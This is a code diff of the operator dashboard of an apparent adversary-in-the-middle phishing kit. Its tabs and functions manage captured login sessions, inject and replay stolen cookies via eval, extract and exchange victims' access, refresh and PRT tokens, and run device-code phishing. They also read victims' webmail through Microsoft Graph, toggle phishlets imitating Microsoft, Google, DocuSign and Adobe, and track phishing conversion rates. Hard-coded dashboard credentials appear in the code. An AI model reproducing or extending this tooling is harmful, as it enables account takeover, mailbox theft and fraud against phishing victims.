-            <button class="btn btn-primary" onclick="scanPRT()">🔍 Scan PRTs</button>
-            <button class="btn btn-success" onclick="healthCheckPRTAll()">🩺 Health All</button>
-            <button class="btn btn-warning" onclick="exchangePRTAll()">🔄 Exchange All</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="prtStats">Loading...</span>
+        <!-- PRT TAB -->
+        <div class="tab-content" id="tab-prt">
+            <div class="panel">
+                <h3>🔐 PRT Engine</h3>
+                <div class="flex-row" style="margin-bottom:15px">
+                    <button class="btn btn-primary" onclick="scanPRTs()">🔍 Scan PRTs</button>
+                    <button class="btn" onclick="healthAllPRTs()">💚 Health All</button>
+                    <button class="btn" onclick="exchangeAllPRTs()">🔄 Exchange All</button>
+                </div>
+                <div id="prtStats"></div>
+                <div id="prtList"><div class="loading">Scan to see PRTs</div></div>
+            </div>
         </div>
-        <div class="table-wrap glass" style="padding:8px;">
-            <table>
-                <thead><tr><th>Username</th><th>PRT (truncated)</th><th>Timestamp</th><th>Source</th><th>Actions</th></tr></thead>
-                <tbody id="prtTable"><tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No PRTs found. Click "Scan PRTs".</td></tr></tbody>
-            </table>
+
+        <!-- RECON TAB -->
+        <div class="tab-content" id="tab-recon">
+            <div class="panel">
+                <h3>🔍 Reconnaissance</h3>
+                <input type="text" id="reconToken" placeholder="Paste access token here...">
+                <button class="btn btn-primary" onclick="runRecon()" style="margin-top:8px">🔍 Run Recon</button>
+                <div id="reconResult"></div>
+            </div>
         </div>
-    </div>
 
-    <!-- ==================== TAB: Recon ==================== -->
-    <div id="tab-recon" class="tab-content">
-        <div class="toolbar glass">
-            <label for="reconToken" style="display:none;">Access Token</label>
-            <input type="text" id="reconToken" placeholder="Access Token..." style="flex:2; min-width:200px;">
-            <button class="btn btn-primary" onclick="doRecon()">🔍 Recon</button>
-            <button class="btn btn-success" onclick="loadReconFromVault()">📥 From Vault</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Microsoft Graph recon</span>
+        <!-- WEBMAIL TAB -->
+        <div class="tab-content" id="tab-webmail">
+            <div class="panel">
+                <h3>📧 Webmail</h3>
+                <input type="text" id="webmailToken" placeholder="Paste access token here...">
+                <div class="flex-row" style="margin-top:8px">
+                    <button class="btn btn-primary" onclick="loadFolders()">📁 Load Folders</button>
+                    <button class="btn" onclick="loadEmails('inbox')">📥 Inbox</button>
+                    <button class="btn" onclick="loadEmails('sent')">📤 Sent</button>
+                </div>
+                <div id="webmailFolders"></div>
+                <div id="webmailEmails"></div>
+            </div>
         </div>
-        <div id="reconResult" class="glass" style="padding:16px; margin-bottom:20px;">
-            <p style="color:rgba(255,255,255,0.5);">Recon results will appear here.</p>
-        </div>
-    </div>
+    </main>
 
-    <!-- ==================== TAB: Webmail ==================== -->
-    <div id="tab-webmail" class="tab-content">
-        <div class="toolbar glass">
-            <label for="webmailToken" style="display:none;">Access Token</label>
-            <input type="text" id="webmailToken" placeholder="Access Token..." style="flex:2; min-width:200px;">
-            <label for="webmailFolder" style="display:none;">Folder</label>
-            <select id="webmailFolder"><option value="inbox">Inbox</option><option value="sent">Sent</option></select>
-            <label for="webmailLimit" style="display:none;">Limit</label>
-            <input type="number" id="webmailLimit" value="20" style="width:80px;">
-            <button class="btn btn-primary" onclick="loadWebmail()">📧 Load Emails</button>
-            <button class="btn btn-success" onclick="loadWebmailFromVault()">📥 From Vault</button>
-        </div>
-        <div class="table-wrap glass" style="padding:8px;">
-            <table>
-                <thead><tr><th>Subject</th><th>From</th><th>Received</th><th>Actions</th></tr></thead>
-                <tbody id="webmailTable"><tr><td colspan="4" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Load emails with an access token.</td></tr></tbody>
-            </table>
-        </div>
-    </div>
-</div>
+    <div class="toast" id="toast"></div>
 
-<!-- Modal -->
-<div class="modal" id="modal">
-    <div class="modal-content glass">
-        <button class="modal-close" onclick="closeModal()">✕ Close</button>
-        <h3 id="modalTitle" style="margin-bottom:12px;">Details</h3>
-        <div id="modalBody"></div>
-    </div>
-</div>
-
-<div id="toastContainer"></div>
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-    // ============================================================
-    // GLOBALS
-    // ============================================================
-    let allLogs = [];
-    let map = null;
-    let chart = null;
-    let analyticsChart = null;
-    let reconnectAttempts = 0;
-    const maxReconnectAttempts = 20;
-    let ws;
-    let vaultTokens = [];
-    let deviceFlows = [];
-    let prts = [];
-
-    // ============================================================
-    // THEME
-    // ============================================================
-    function toggleTheme() {
-        document.body.classList.toggle('light-glass');
-        localStorage.setItem('theme', document.body.classList.contains('light-glass') ? 'light' : 'dark');
-    }
-    (function restoreTheme() {
-        if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-glass');
-    })();
-
-    // ============================================================
-    // TABS
-    // ============================================================
-    function switchTab(tabId) {
-        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
-        document.getElementById('tab-' + tabId).classList.add('active');
-        document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
-        if (tabId === 'vault') loadVault();
-        if (tabId === 'analytics') loadAnalytics();
-        if (tabId === 'phishlets') loadPhishlets();
-        if (tabId === 'device') loadDeviceHistory();
-        if (tabId === 'prt') loadPRTList();
-    }
-
-    // ============================================================
-    // TOAST & MODAL
-    // ============================================================
-    function showToast(msg, isError = false) {
-        const container = document.getElementById('toastContainer');
-        const toast = document.createElement('div');
-        toast.className = 'toast' + (isError ? ' error' : '');
-        toast.textContent = msg;
-        container.appendChild(toast);
-        setTimeout(() => toast.remove(), 4000);
-    }
-
-    function openModal(title, bodyHTML) {
-        document.getElementById('modalTitle').textContent = title;
-        document.getElementById('modalBody').innerHTML = bodyHTML;
-        document.getElementById('modal').style.display = 'flex';
-    }
-
-    function closeModal() { document.getElementById('modal').style.display = 'none'; }
-    document.getElementById('modal').addEventListener('click', e => { if (e.target === e.currentTarget) closeModal(); });
-
-    // ============================================================
-    // API HELPERS (with Basic Auth)
-    // ============================================================
-    const API_BASE = '/dash/api';
-    let authHeader = '';
-
-    function getAuthHeader() {
-        if (authHeader) return authHeader;
-        const user = prompt('Dashboard Username:', 'svrpsdev');
-        const pass = prompt('Dashboard Password:', 'Cozysarps18!');
-        authHeader = 'Basic ' + btoa(user + ':' + pass);
-        return authHeader;
-    }
-
-    async function apiFetch(endpoint, options = {}) {
-        const headers = {
-            'Authorization': getAuthHeader(),
-            'Content-Type': 'application/json',
-            ...options.headers
-        };
-        const res = await fetch(API_BASE + endpoint, { ...options, headers });
-        if (!res.ok) {
-            const errText = await res.text();
-            throw new Error(errText || `HTTP ${res.status}`);
+    <script>
+        // ============================================================
+        // 🔧 API HELPER
+        // ============================================================
+        const API_BASE = '/dash/api';
+        
+        async function api(path, options = {}) {
+            const url = API_BASE + path;
+            const config = {
+                headers: { 'Content-Type': 'application/json' },
+                ...options
+            };
+            if (options.body && typeof options.body === 'object') {
+                config.body = JSON.stringify(options.body);
+            }
+            const res = await fetch(url, config);
+            if (!res.ok) {
+                const err = await res.json().catch(() => ({ error: res.statusText }));
+                throw new Error(err.error || 'Request failed');
+            }
+            return res.json();
         }
-        return res.json();
-    }
 
-    // ============================================================
-    // WEBSOCKET (with startHeartbeat defined)
-    // ============================================================
-    let heartbeatInterval;
+        function showToast(msg, isError = false) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.className = 'toast ' + (isError ? 'error' : '') + ' show';
+            setTimeout(() => t.classList.remove('show'), 3000);
+        }
 
-    function startHeartbeat() {
-        if (heartbeatInterval) clearInterval(heartbeatInterval);
-        heartbeatInterval = setInterval(() => {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send('ping');
-            }
-        }, 25000);
-    }
+        // ============================================================
+        // 🎨 THEME + NAVIGATION
+        // ============================================================
+        function toggleTheme() {
+            const html = document.documentElement;
+            const current = html.getAttribute('data-theme');
+            html.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
+            localStorage.setItem('phantom-theme', current === 'dark' ? 'light' : 'dark');
+        }
+        (function() {
+            const saved = localStorage.getItem('phantom-theme');
+            if (saved) document.documentElement.setAttribute('data-theme', saved);
+        })();
 
-    function connectWebSocket() {
-        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
-        ws = new WebSocket(wsProtocol + location.host + '/ws');
-        const dot = document.getElementById('wsDot'), label = document.getElementById('wsLabel');
-        ws.onopen = () => {
-            dot.className = 'ws-dot online';
-            label.textContent = 'Live';
-            reconnectAttempts = 0;
-            startHeartbeat();
-        };
-        ws.onclose = () => {
-            dot.className = 'ws-dot offline';
-            label.textContent = 'Disconnected';
-            if (reconnectAttempts < maxReconnectAttempts) {
-                reconnectAttempts++;
-                setTimeout(connectWebSocket, Math.min(5000 + reconnectAttempts * 1000, 30000));
-            }
-        };
-        ws.onmessage = (e) => {
+        document.querySelectorAll('.sidebar nav a').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const tab = link.getAttribute('data-tab');
+                switchTab(tab);
+            });
+        });
+
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.sidebar nav a').forEach(l => l.classList.remove('active'));
+            const target = document.getElementById('tab-' + tab);
+            if (target) target.classList.add('active');
+            const navLink = document.querySelector(`[data-tab="${tab}"]`);
+            if (navLink) navLink.classList.add('active');
+            document.getElementById('pageTitle').textContent = 
+                tab === 'dashboard' ? '📊 Dashboard' :
+                tab === 'sessions' ? '📋 Sessions' :
+                tab === 'vault' ? '🏛️ Token Vault' :
+                tab === 'analytics' ? '📈 Analytics' :
+                tab === 'device' ? '📱 Device Code' :
+                tab === 'prt' ? '🔐 PRT Engine' :
+                tab === 'recon' ? '🔍 Recon' :
+                tab === 'webmail' ? '📧 Webmail' : '📊 Dashboard';
+            if (tab === 'sessions') loadAllSessions();
+            if (tab === 'device') loadDeviceHistory();
+            if (tab === 'prt') loadPRTList();
+            if (tab === 'analytics') loadAnalytics();
+            if (tab === 'vault') loadVaultStats();
+        }
+
+        // ============================================================
+        // 📊 DASHBOARD
+        // ============================================================
+        async function refreshAll() {
             try {
-                const data = JSON.parse(e.data);
-                if (data.type === 'newLog') { showToast('📥 New capture: ' + data.file); refreshLogs(); }
-            } catch (e) {}
-        };
-    }
-
-    // ============================================================
-    // FLAG HELPER
-    // ============================================================
-    function getFlagEmoji(code) {
-        if (!code || code.length !== 2) return '🌍';
-        return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0)-65, 0x1F1E6 + code.charCodeAt(1)-65);
-    }
-
-    // ============================================================
-    // DASHBOARD TAB
-    // ============================================================
-    async function refreshLogs() {
-        try {
-            const logs = await apiFetch('/logs');
-            allLogs = logs;
-            renderTable(logs);
-            updateStats(logs);
-            updateMap(logs);
-            updateChart(logs);
-            await fetchVisits();
-        } catch (e) { showToast('Failed to fetch logs: ' + e.message, true); }
-    }
-
-    function renderTable(logs) {
-        const tbody = document.getElementById('logTable');
-        const search = document.getElementById('searchInput').value.toLowerCase();
-        const filter = document.getElementById('filterDate').value;
-        const now = new Date();
-        let filtered = logs;
-        if (search) filtered = filtered.filter(log => log.name.toLowerCase().includes(search));
-        if (filter === 'today') filtered = filtered.filter(log => new Date(log.modified).toDateString() === now.toDateString());
-        else if (filter === 'week') {
-            const weekAgo = new Date(now.getTime() - 7*24*60*60*1000);
-            filtered = filtered.filter(log => new Date(log.modified) >= weekAgo);
+                const [status, visits] = await Promise.all([
+                    api('/status').catch(() => ({ online: false, totalSessions: 0 })),
+                    api('/visits').catch(() => ({ total: 0, uniqueIPs: 0, today: 0 }))
+                ]);
+                document.getElementById('statSessions').textContent = status.totalSessions || 0;
+                document.getElementById('statStatus').innerHTML = status.online ? '✅ Online' : '❌ Offline';
+                document.getElementById('statStatus').className = 'value ' + (status.online ? 'green' : 'red');
+                document.getElementById('statVisits').textContent = visits.total || 0;
+                document.getElementById('statUniqueIPs').textContent = visits.uniqueIPs || 0;
+                document.getElementById('statToday').textContent = visits.today || 0;
+                showToast('Dashboard refreshed');
+            } catch (e) {
+                showToast('Refresh failed: ' + e.message, true);
+            }
         }
-        tbody.innerHTML = '';
-        filtered.forEach(log => {
-            const date = new Date(log.modified).toLocaleString();
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td><span class="badge">${log.name}</span></td>
-                <td>${(log.size/1024).toFixed(1)} KB</td>
-                <td>${date}</td>
-                <td id="user-${log.name}">Loading...</td>
-                <td id="ip-${log.name}">Loading...</td>
-                <td>
-                    <button class="action-btn" onclick="viewLog('${log.name}')">🔍 View</button>
-                    <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
-                    <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
-                    <button class="action-btn token" onclick="showTokens('${log.name}')" style="border-color:rgba(255,215,0,0.3);color:#ffd700;">🔑 Tokens</button>
-                </td>
-            `;
-            tbody.appendChild(row);
-            fetchMetadata(log.name);
-        });
-    }
 
-    async function fetchMetadata(filename) {
-        try {
-            const data = await apiFetch(`/log/${encodeURIComponent(filename)}`);
-            if (data.entries && data.entries.length) {
-                let username = 'N/A', ip = 'N/A';
-                for (const entry of data.entries) {
-                    const body = entry.proxyRequestBody;
-                    if (body) {
-                        try {
-                            const parsed = typeof body === 'string' ? JSON.parse(body) : body;
-                            username = parsed.username || parsed.login || parsed.user || parsed.Email || parsed.upn || 'N/A';
-                            if (username !== 'N/A') break;
-                        } catch (e) {
-                            const match = body.match(/(?:username|login|user|Email|loginfmt|upn)=([^&]+)/i);
-                            if (match) { username = decodeURIComponent(match[1]); break; }
-                        }
-                    }
-                    ip = entry.proxyRequestHeaders?.['cf-connecting-ip'] ||
-                         entry.proxyRequestHeaders?.['x-real-ip'] ||
-                         entry.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() ||
-                         'N/A';
-                    if (ip !== 'N/A') break;
-                }
-                const userCell = document.getElementById(`user-${filename}`);
-                if (userCell) userCell.textContent = username;
-                const ipCell = document.getElementById(`ip-${filename}`);
-                if (ipCell) ipCell.textContent = ip;
+        async function exportZip() {
+            try {
+                const res = await fetch(API_BASE + '/export/all');
+                if (!res.ok) throw new Error('Export failed');
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'phantom_export_' + Date.now() + '.zip';
+                a.click();
+                showToast('Export downloaded');
+            } catch (e) {
+                showToast('Export failed: ' + e.message, true);
             }
-        } catch (e) {}
-    }
-
-    function updateStats(logs) {
-        document.getElementById('total').textContent = logs.length;
-        document.getElementById('last').textContent = logs.length > 0 ? new Date(logs[0].modified).toLocaleString() : 'No captures';
-    }
-
-    function updateMap(logs) {
-        if (!map) {
-            map = L.map('map').setView([20,0],2);
-            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map);
         }
-        map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
-        L.marker([20,0]).addTo(map).bindPopup('📍 IP locations will appear once you have captures.');
-    }
 
-    function updateChart(logs) {
-        const ctx = document.getElementById('captureChart').getContext('2d');
-        const now = new Date();
-        const days = {};
-        for (let i=6; i>=0; i--) { const d = new Date(now.getTime() - i*24*60*60*1000); days[d.toDateString()] = 0; }
-        logs.forEach(log => { const d = new Date(log.modified).toDateString(); if (days.hasOwnProperty(d)) days[d]++; });
-        if (chart) chart.destroy();
-        chart = new Chart(ctx, {
-            type: 'bar',
-            data: {
-                labels: Object.keys(days),
-                datasets: [{
-                    label: 'Captures',
-                    data: Object.values(days),
-                    backgroundColor: 'rgba(130,177,255,0.4)',
-                    borderColor: '#82b1ff',
-                    borderWidth: 2,
-                    borderRadius: 8
-                }]
-            },
-            options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: '#a0b0c0' } } }, scales: { y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { ticks: { color: '#a0b0c0' }, grid: { display: false } } } }
-        });
-    }
-
-    async function fetchVisits() {
-        try {
-            const data = await apiFetch('/visits');
-            document.getElementById('totalVisits').textContent = data.total || 0;
-            document.getElementById('uniqueIPs').textContent = data.uniqueIPs || 0;
-            document.getElementById('todayVisits').textContent = data.today || 0;
-            const tbody = document.getElementById('visitsTable');
-            if (!data.visits || data.visits.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No visits recorded yet</td></tr>`;
-                return;
+        async function testTelegram() {
+            try {
+                const res = await api('/test-telegram');
+                showToast('Telegram test: ' + (res.success ? '✅ Sent' : '❌ Failed'));
+            } catch (e) {
+                showToast('Telegram test failed: ' + e.message, true);
             }
-            tbody.innerHTML = '';
-            data.visits.forEach(visit => {
-                const row = document.createElement('tr');
-                const time = new Date(visit.timestamp).toLocaleString();
-                const ua = visit.userAgent || 'Unknown';
-                const truncatedUA = ua.length > 40 ? ua.substring(0,40)+'...' : ua;
-                const flag = getFlagEmoji(visit.countryCode || 'UN');
-                row.innerHTML = `
-                    <td style="font-size:12px; color:rgba(255,255,255,0.6);">${time}</td>
-                    <td style="font-size:18px; text-align:center;" title="${visit.countryCode || 'UN'}">${flag}</td>
-                    <td style="font-family:monospace; font-size:13px;">${visit.ip}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.6);">${truncatedUA}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${visit.referer || 'Direct'}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.5);">${visit.url || '/'}</td>
-                `;
-                tbody.appendChild(row);
-            });
-        } catch (e) { console.error('Visits fetch failed:', e); }
-    }
-
-    function filterTable() { renderTable(allLogs); }
-
-    // ============================================================
-    // VIEW LOG
-    // ============================================================
-    async function viewLog(filename) {
-        try {
-            const data = await apiFetch(`/log/${encodeURIComponent(filename)}`);
-            let html = '';
-            data.entries.forEach((entry, idx) => {
-                html += `<h4>Entry ${idx+1}</h4><pre>${JSON.stringify(entry, null, 2)}</pre>`;
-            });
-            openModal(`📄 ${filename}`, html);
-        } catch (e) { showToast('Failed to load log: ' + e.message, true); }
-    }
-
-    // ============================================================
-    // INJECT COOKIES
-    // ============================================================
-    async function injectCookies(filename) {
-        try {
-            const data = await apiFetch(`/log/${encodeURIComponent(filename)}`);
-            let cookies = [];
-            data.entries.forEach(entry => {
-                const setCookie = entry.proxyResponseHeaders?.['set-cookie'];
-                if (setCookie) {
-                    const arr = Array.isArray(setCookie) ? setCookie : [setCookie];
-                    arr.forEach(c => {
-                        const [nameVal] = c.split(';');
-                        if (nameVal) cookies.push(nameVal);
-                    });
-                }
-            });
-            if (cookies.length === 0) { showToast('No cookies found.', true); return; }
-            const cookieString = cookies.join('; ');
-            await navigator.clipboard.writeText(cookieString);
-            showToast(`🍪 ${cookies.length} cookies copied to clipboard.`);
-        } catch (e) { showToast('Error: ' + e.message, true); }
-    }
-
-    // ============================================================
-    // REPLAY SESSION
-    // ============================================================
-    async function replaySession(filename) {
-        try {
-            const data = await apiFetch(`/replay/${encodeURIComponent(filename)}`);
-            if (data.error) { showToast('Replay failed: '+data.error, true); return; }
-            eval(data.replayScript);
-            showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
-        } catch (e) { showToast('Replay error: '+e.message, true); }
-    }
-
-    // ============================================================
-    // SHOW TOKENS
-    // ============================================================
-    async function showTokens(filename) {
-        try {
-            const data = await apiFetch(`/tokens/${encodeURIComponent(filename)}`);
-            const tokens = data.tokens || {};
-            let msg = `🔑 Extracted:\n`;
-            msg += `• Access: ${tokens.access_tokens?.length || 0}\n`;
-            msg += `• Refresh: ${tokens.refresh_tokens?.length || 0}\n`;
-            msg += `• ID: ${tokens.id_tokens?.length || 0}\n`;
-            msg += `• PRT: ${tokens.prt_tokens?.length || 0}\n`;
-            msg += `• Cookies: ${tokens.cookies?.length || 0}`;
-            if (tokens.access_tokens && tokens.access_tokens.length > 0) {
-                msg += `\n\nFirst Access Token:\n${tokens.access_tokens[0].slice(0, 60)}...`;
-            }
-            openModal(`🔑 Tokens from ${filename}`, `<pre>${msg}</pre>`);
-        } catch (e) { showToast('Tokens error: '+e.message, true); }
-    }
-
-    // ============================================================
-    // EXPORT ALL
-    // ============================================================
-    async function exportAll() {
-        try {
-            const res = await fetch(API_BASE + '/export/all', { headers: { 'Authorization': getAuthHeader() } });
-            if (!res.ok) throw new Error('Export failed');
-            const blob = await res.blob();
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a'); a.href = url; a.download = 'all_sessions.zip'; a.click();
-            showToast('✅ Export successful!');
-        } catch (e) { showToast('Export error: '+e.message, true); }
-    }
-
-    // ============================================================
-    // TOKEN VAULT TAB
-    // ============================================================
-    async function scanVault() {
-        showToast('🔍 Scanning logs...');
-        try {
-            const data = await apiFetch('/vault/scan', { method: 'POST' });
-            if (data.success) { showToast(`✅ Found ${data.count} tokens.`); loadVault(); }
-        } catch (e) { showToast('Scan failed: '+e.message, true); }
-    }
-
-    async function healthCheckVault() {
-        showToast('🩺 Checking token health...');
-        try {
-            const data = await apiFetch('/vault/healthcheck', { method: 'POST' });
-            if (data.success) {
-                const valid = data.results.filter(r => r.status === 'valid').length;
-                showToast(`✅ ${valid} valid, ${data.results.length - valid} invalid.`);
-                loadVault();
-            }
-        } catch (e) { showToast('Health check failed: '+e.message, true); }
-    }
-
-    async function loadVault() {
-        try {
-            const data = await apiFetch('/vault/tokens');
-            vaultTokens = data.tokens || [];
-            const stats = await apiFetch('/vault/stats');
-            document.getElementById('vaultStats').textContent = `📊 ${stats.stats.total} tokens · ${stats.stats.access} access · ${stats.stats.refresh} refresh`;
-            const tbody = document.getElementById('vaultTable');
-            if (vaultTokens.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault.</td></tr>`;
-                return;
-            }
-            tbody.innerHTML = '';
-            vaultTokens.slice(0, 50).forEach(t => {
-                const row = document.createElement('tr');
-                const typeLabel = t.type === 'access' ? '🔑 Access' : t.type === 'refresh' ? '🔄 Refresh' : t.type === 'id' ? '🆔 ID' : '🔐 PRT';
-                row.innerHTML = `
-                    <td><span class="badge badge-info">${typeLabel}</span></td>
-                    <td>${t.username || 'unknown'}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${t.file || 'N/A'}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${new Date(t.timestamp).toLocaleString()}</td>
-                    <td>
-                        <button class="action-btn token" onclick="exchangeVaultToken('${t.value}')">🔄 Exchange</button>
-                        <button class="action-btn" onclick="navigator.clipboard.writeText('${t.value}')">📋 Copy</button>
-                    </td>
-                `;
-                tbody.appendChild(row);
-            });
-        } catch (e) { console.error('Vault load failed:', e); }
-    }
-
-    async function exchangeVaultToken(tokenValue) {
-        if (!confirm('Exchange this token for a fresh access token?')) return;
-        try {
-            const data = await apiFetch('/vault/exchange', {
-                method: 'POST',
-                body: JSON.stringify({ tokenValue })
-            });
-            if (data.success) {
-                showToast('✅ New access token obtained!');
-                localStorage.setItem('evil_token', JSON.stringify(data.data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
-                loadVault();
-            } else {
-                showToast('Exchange failed: ' + (data.error || 'Unknown'), true);
-            }
-        } catch (e) { showToast('Exchange error: '+e.message, true); }
-    }
-
-    // ============================================================
-    // ANALYTICS TAB
-    // ============================================================
-    async function loadAnalytics() {
-        try {
-            const data = await apiFetch('/analytics');
-            const a = data.analytics;
-            document.getElementById('analyticsVisits').textContent = a.visits.total;
-            document.getElementById('analyticsCaptures').textContent = a.captures.total;
-            document.getElementById('analyticsConversion').textContent = a.conversionRate.total + '%';
-            document.getElementById('analyticsUniqueIPs').textContent = a.uniqueIPs;
-
-            const domainList = document.getElementById('topDomainsList');
-            if (a.topDomains && a.topDomains.length) {
-                domainList.innerHTML = a.topDomains.map(d => `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>${d.domain}</span><span style="color:rgba(255,255,255,0.4);">${d.count}</span></div>`).join('');
-            } else {
-                domainList.innerHTML = '<p style="color:rgba(255,255,255,0.3);">No domains tracked yet.</p>';
-            }
-
-            const convDetails = document.getElementById('conversionDetails');
-            convDetails.innerHTML = `
-                <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>📊 Today</span><span>${a.conversionRate.today}% (${a.captures.today}/${a.visits.today})</span></div>
-                <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>📊 This Week</span><span>${a.conversionRate.week}% (${a.captures.week}/${a.visits.week})</span></div>
-                <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.03);"><span>📊 This Month</span><span>${a.conversionRate.month}% (${a.captures.month}/${a.visits.month})</span></div>
-                <div style="display:flex;justify-content:space-between;padding:4px 0;"><span>📊 Total</span><span>${a.conversionRate.total}% (${a.captures.total}/${a.visits.total})</span></div>
-            `;
-
-            const ctx = document.getElementById('analyticsChart').getContext('2d');
-            if (analyticsChart) analyticsChart.destroy();
-            const labels = Object.keys(a.dailyCaptures || {});
-            const captureData = Object.values(a.dailyCaptures || {});
-            const visitData = Object.values(a.dailyVisits || {});
-            analyticsChart = new Chart(ctx, {
-                type: 'bar',
-                data: {
-                    labels: labels,
-                    datasets: [
-                        { label: 'Captures', data: captureData, backgroundColor: 'rgba(130,177,255,0.4)', borderColor: '#82b1ff', borderWidth: 2, borderRadius: 8 },
-                        { label: 'Visits', data: visitData, backgroundColor: 'rgba(255,215,0,0.2)', borderColor: '#ffd700', borderWidth: 2, borderRadius: 8 }
-                    ]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: { legend: { labels: { color: '#a0b0c0' } } },
-                    scales: {
-                        y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } },
-                        x: { ticks: { color: '#a0b0c0' }, grid: { display: false } }
-                    }
-                }
-            });
-        } catch (e) { console.error('Analytics load failed:', e); }
-    }
-
-    // ============================================================
-    // PHISHLETS TAB
-    // ============================================================
-    async function loadPhishlets() {
-        try {
-            const data = await apiFetch('/phishlets');
-            const phishlets = data.phishlets || {};
-            const tbody = document.getElementById('phishletsTable');
-            if (Object.keys(phishlets).length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No phishlets configured.</td></tr>`;
-                return;
-            }
-            tbody.innerHTML = '';
-            Object.entries(phishlets).forEach(([id, p]) => {
-                const row = document.createElement('tr');
-                const iconMap = { microsoft: '🪟', google: '🔴', docusign: '📄', adobe: '🎨' };
-                const icon = iconMap[id] || '📄';
-                row.innerHTML = `
-                    <td><strong>${p.name}</strong></td>
-                    <td style="font-size:20px;">${icon}</td>
-                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.file}</td>
-                    <td style="font-size:12px;color:rgba(255,255,255,0.4);">${p.entryPoint}</td>
-                    <td><span class="badge ${p.enabled ? 'badge-success' : 'badge-danger'}">${p.enabled ? '✅ Enabled' : '❌ Disabled'}</span></td>
-                    <td>
-                        <label class="switch" for="switch-${id}">
-                            <input type="checkbox" id="switch-${id}" ${p.enabled ? 'checked' : ''} onchange="togglePhishlet('${id}', this.checked)">
-                            <span class="slider"></span>
-                        </label>
-                    </td>
-                `;
-                tbody.appendChild(row);
-            });
-        } catch (e) { console.error('Phishlets load failed:', e); }
-    }
-
-    async function togglePhishlet(id, enabled) {
-        try {
-            const data = await apiFetch('/phishlets/toggle', {
-                method: 'POST',
-                body: JSON.stringify({ id, enabled })
-            });
-            if (data.success) { showToast(`✅ ${id} ${enabled ? 'enabled' : 'disabled'}`); loadPhishlets(); }
-        } catch (e) { showToast('Toggle failed: '+e.message, true); }
-    }
-
-    // ============================================================
-    // DEVICE CODE TAB
-    // ============================================================
-    async function requestDeviceCode() {
-        try {
-            const data = await apiFetch('/device/request', { method: 'POST' });
-            showToast(`📱 Device code: ${data.user_code} - Visit ${data.verification_uri}`);
-            await loadDeviceHistory();
-        } catch (e) { showToast('Device request failed: '+e.message, true); }
-    }
-
-    async function pollDeviceToken() {
-        const code = prompt('Enter device_code:');
-        if (!code) return;
-        try {
-            const data = await apiFetch('/device/token', {
-                method: 'POST',
-                body: JSON.stringify({ device_code: code })
-            });
-            if (data.access_token) {
-                showToast('✅ Token obtained!');
-                loadDeviceHistory();
-            } else {
-                showToast('Authorization pending...', true);
-            }
-        } catch (e) { showToast('Poll failed: '+e.message, true); }
-    }
-
-    async function loadDeviceHistory() {
-        try {
-            const data = await apiFetch('/device/history');
-            deviceFlows = data.flows || [];
-            const tbody = document.getElementById('deviceTable');
-            if (deviceFlows.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows.</td></tr>`;
-                return;
-            }
-            tbody.innerHTML = '';
-            deviceFlows.slice().reverse().forEach(f => {
-                const row = document.createElement('tr');
-                const statusClass = f.status === 'approved' ? 'badge-success' : 'badge-warning';
-                row.innerHTML = `
